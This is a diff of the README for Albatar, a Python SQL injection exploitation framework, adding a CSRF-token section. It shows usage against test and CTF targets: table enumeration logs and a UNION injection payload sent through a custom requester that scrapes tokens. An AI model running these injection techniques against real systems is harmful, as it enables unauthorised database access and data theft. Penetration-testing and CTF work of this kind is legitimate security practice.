@@ -1,8 +1,8 @@
 I wrote Albatar to have a neat and tidy tool to exploit SQL Injection vulnerabilities.
 
-Unlike [sqlmap](http://sqlmap.org/), Albatar will not detect SQL Injection vulnerabilities but it is designed to exploit not-so-straightforward SQLIs where sqlmap would need tweaking and patching to work.
+Unlike [sqlmap](http://sqlmap.org/), Albatar will not detect SQL Injection vulnerabilities, it was primarily designed to help me exploit not-so-straightforward SQLIs where sqlmap would need tweaking and patching to work.
 
-Albatar is a framework in Python. As a result, you need to write some Python code to be able to exploit the SQLI. Then simply invoke your script by passing sqlmap-like command line options (e.g. --dbs, --banner ...) to retrieve data from the database.
+Albatar is a framework in Python. As a result, you need to write some Python code to be able to exploit the SQLI. Then simply invoke your script by passing sqlmap-like command line options (like --dbs, --banner etc.) to retrieve data from the database.
 
 Currently, Albatar supports MySQL, MSSQL and Oracle with the Union, Error, Boolean and Time techniques.
 
@@ -44,8 +44,8 @@ for r in sqli.exploit():
   print r
 ```
 
-And execute the script to exploit the SQLI:
-```bash
+Then execute the script to exploit the SQLI:
+```
 $ python testphp-union.py -D acuart --tables
 17:39:59 albatar - Starting Albatar v0.0 (https://github.com/lanjelot/albatar) at 2016-04-21 17:39 AEST
 17:39:59 albatar - Executing: ('(SELECT COUNT(*) X FROM information_schema.tables WHERE table_schema="acuart")a', '(SELECT table_name X FROM information_schema.tables WHERE table_schema="acuart" LIMIT ${row_pos},${row_count})a')
@@ -101,7 +101,7 @@ for r in sqli.exploit():
 ```
 
 And execute:
-```bash
+```
 $ python testphp.py -b
 14:19:22 albatar - Starting Albatar v0.0 (https://github.com/lanjelot/albatar) at 2016-04-21 14:19 AEST
 14:19:22 albatar - Executing: 'SELECT VERSION()'
@@ -112,4 +112,38 @@ $ python testphp.py -b
 * Encoding / WAF evasion
 
 If you need to encode your payload to meet specific requirements, simply code a function to mangle the payload in every request.
-The web task [luhn-300](https://github.com/ctfs/write-ups-2016/tree/master/nullcon-hackim-2016/web/luhn-300) for Hackim CTF 2016 was a good example to showcase this.
+The web task [luhn-300](https://github.com/ctfs/write-ups-2016/tree/master/nullcon-hackim-2016/web/luhn-300) from Hackim CTF 2016 was a good example to showcase this.
+
+* CSRF tokens
+
+If you need to do anything before or after submitting the SQLI payload, simply extend the Requester class. For example, if you need to provide a CSRF token, like with the web task [hackme-400](https://github.com/ctfs/write-ups-2016/tree/master/su-ctf-2016/web/hackme-400) from SU CTF 2016, write something like this:
+```python
+...
+class Requester_CSRF(Requester_HTTP_requests):
+
+  def test(self, payload):
+    response = self.session.get('http://ctf.sharif.edu:35455/chal/hackme/8b784460681e5282/login.php')
+    token = re.search("name='user_token' value='([^']+)'", response.text).group(1)
+    self.http_opts[2] = self.http_opts[2].replace('_CSRF_', token)
+
+    return super(Requester_CSRF, self).test(payload)
+
+def mysql_union():
+
+  def make_requester():
+    return Requester_CSRF(
+      proxies = PROXIES,
+      headers = HEADERS,
+      url = 'http://ctf.sharif.edu:35455/chal/hackme/8b784460681e5282/login.php',
+      body = 'username=${injection}&password=asdf&Login=Login&user_token=_CSRF_',
+      method = 'POST',
+      response_processor = extract_results,
+      encode_payload = quote,
+      )
+
+  template = "a' union select concat(0x3a4142433a,X,0x3a4142433a),null,null,null from ${query} #"
+
+  return Method_union(make_requester, template, pager=10)
+```
+
+You could even write a brand new Requester class to exploit a SQLI that is not in a web application, but in a command line application for example.
